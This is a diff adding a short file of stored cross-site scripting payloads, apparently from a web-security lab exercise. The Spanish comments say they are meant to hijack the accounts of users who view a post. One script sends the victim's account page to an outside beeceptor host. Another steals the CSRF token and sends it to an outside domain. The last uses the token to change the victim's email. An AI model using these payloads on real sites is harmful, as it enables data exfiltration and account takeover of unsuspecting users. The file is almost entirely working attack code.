@@ -1,0 +1,38 @@
+// Esto es para que el usuario que vea el post, haga, de manera involuntaria, una petición a my-account y la respuesta nos la de a un servidor DNS (nos devolverá datos de  su cuenta). En el siguiente script vamos a robarle el csrf_token para poder tramitar nosotros a mano lo que queramos con su cuenta.
+<script>
+  var req = new XMLHttpRequest();
+  req-open("GET", "/my-account", false);
+  req.send();
+  var response = req.responseText;
+  var req2 = new XMLHttpRequest();
+  req2.open('GET', "https://ejericio2.free.beeceptor.com?response=" + btoa(response));
+  req2.send();
+</script>
+
+<script>
+  var req = new XMLHttpRequest();
+  req.open('get','/my-account', false);
+  req.send();
+  var response = req.responseText;
+  var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
+  var req2 = new XMLHttpRequest();
+  req2.open('GET', "https://my.domain.com?token=" + csrf_token);
+  req2.send();
+</script>
+
+
+// Esto es para que el usuario que vea el post, haga una petición a my-account y que directamente tramite el cambio de email a test@test.com
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(.*?)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    var data = "email=" + encodeURIComponent("testing@test.com") + "&csrf=" + encodeURIComponent(token);
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    changeReq.send(data)
+};
+</script>
